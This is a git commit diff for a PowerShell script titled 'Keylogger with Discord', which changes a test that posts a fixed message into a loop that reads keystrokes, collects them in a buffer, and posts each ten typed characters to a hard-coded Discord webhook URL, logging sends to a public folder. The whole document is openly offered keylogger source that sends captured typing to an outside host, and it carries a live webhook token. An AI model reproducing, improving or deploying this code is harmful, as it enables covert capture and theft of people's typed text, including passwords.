27a9fc4ae5cc1bb42c55dcbb1f5c89cf08dade6a
Kaiondatwzck <103587362+Kaiondatwzck@users.noreply.github.com>
2025-03-30 22:48:36 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,13 +1,21 @@
-# Keylogger Test with Logging by DreadCipher
+# Keylogger with Discord by DreadCipher
 $webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
+$buffer = ""
 
 while ($true) {
-    try {
-        $payload = @{ content = "Test message from keylogger!" } | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
-        "Sent message at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-    } catch {
-        "Error at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+    Start-Sleep -Milliseconds 100
+    if ([Console]::KeyAvailable) {
+        $key = [Console]::ReadKey($true)
+        $buffer += $key.Char
+        if ($buffer.Length -ge 10) {
+            try {
+                $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
+                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
+                "Sent '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+                $buffer = ""
+            } catch {
+                "Error at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+            }
+        }
     }
-    Start-Sleep -Seconds 10
 }
